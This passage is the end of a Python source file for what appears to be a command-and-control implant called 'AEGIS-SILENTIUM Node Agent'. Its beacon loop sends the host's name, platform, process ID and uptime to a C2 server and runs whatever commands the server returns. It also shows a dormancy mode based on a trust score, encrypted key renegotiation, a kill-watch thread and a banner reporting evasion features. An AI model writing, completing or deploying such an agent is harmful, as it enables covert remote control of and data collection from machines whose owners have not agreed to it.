            if HAS_ECDHE and (_ecdhe_session is None or _beacon_seq % _REHANDSHAKE_EVERY == 0):
                _do_ecdhe_handshake(_c2_post)

            trust = _assess()
            if trust["is_dormant"]:
                payload = {"status":"dormant","platform":platform.system(),
                           "hostname":platform.node(),"pid":os.getpid(),
                           "ts":int(time.time()),"score":trust["score"]}
            else:
                payload = {"status":"active","pid":os.getpid(),
                           "platform":platform.system(),"hostname":platform.node(),
                           "trust":trust["score"],"uptime_s":int(time.time()-_start_time),
                           "seq":_beacon_seq}

            resp = _c2_post("/beacon", payload)
            _beacon_seq += 1
            if resp:
                _handle_cmds(resp)

        except Exception as e:
            log.debug("[%s] beacon: %s", NODE_ID[:8], e)
        time.sleep(max(5.0, interval))

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  AEGIS-SILENTIUM  Node Agent  v1.0                               ║
║  Node    : {}
║  C2      : {}
║  ECDHE   : {}   Profile : {}   Evasion : {}
╚══════════════════════════════════════════════════════════════╝""".format(
        NODE_ID.ljust(46)+"║",
        C2_URL.ljust(46)+"║",
        str(HAS_ECDHE).ljust(7),str(HAS_PROFILE).ljust(8),str(HAS_EVASION).ljust(15)+"║"))

    threading.Thread(target=_watch_kill, daemon=True, name="killwatch").start()

    if not register():
        print("[{}] Registration failed — exiting".format(NODE_ID[:8]))
        sys.exit(1)

    beacon_loop()

if __name__ == "__main__":
    main()
